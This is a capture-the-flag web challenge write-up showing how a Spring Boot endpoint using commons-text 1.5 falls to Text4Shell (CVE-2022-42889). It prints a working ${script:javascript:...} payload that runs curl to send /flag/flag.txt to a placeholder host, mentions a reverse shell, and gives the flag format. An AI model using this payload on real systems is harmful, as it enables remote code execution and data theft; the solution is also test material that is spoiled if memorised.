# Copy Ninja

**Category:** web  **Author:** 0xkakashi

Spring Boot app. Run: `docker build -t copy-ninja . && docker run -p 8080:8080 copy-ninja`

## Solution

The front page points you at one endpoint, `/copyninja?chakra=`, and whatever you send comes straight back as `Result: <input>`. Kakashi copies your jutsu.

Looking at `pom.xml`, the app pulls in `commons-text` 1.5, and the controller does this with our input:

```java
StringSubstitutor s = new StringSubstitutor(StringLookupFactory.INSTANCE.interpolatorStringLookup());
s.replace(kakashi_poc);
```

That's Text4Shell (CVE-2022-42889). The default interpolator has the `script`, `dns` and `url` lookups enabled, so `${script:javascript:...}` runs code. The result of `replace()` is thrown away and the page only echoes the raw input, so it's blind; send the output somewhere you control.

```
${script:javascript:java.lang.Runtime.getRuntime().exec('curl -d @/flag/flag.txt https://YOUR-HOST')}
```

URL-encode it and send it as `chakra`. A reverse shell works just as well.

Note: the `script:javascript` lookup needs Nashorn, which only exists up to JDK 14. The first Dockerfile used `openjdk:8`; the current one is on JDK 17, so to reproduce it locally switch the base image back. `docker-entrypoint.sh` (writes the flag to `/flag/flag.txt`) isn't wired into the current Dockerfile either.

Flag is per-instance: `H7CTF{K4K4SH1_5H4R1NG4N_533_411_<uuid>}`
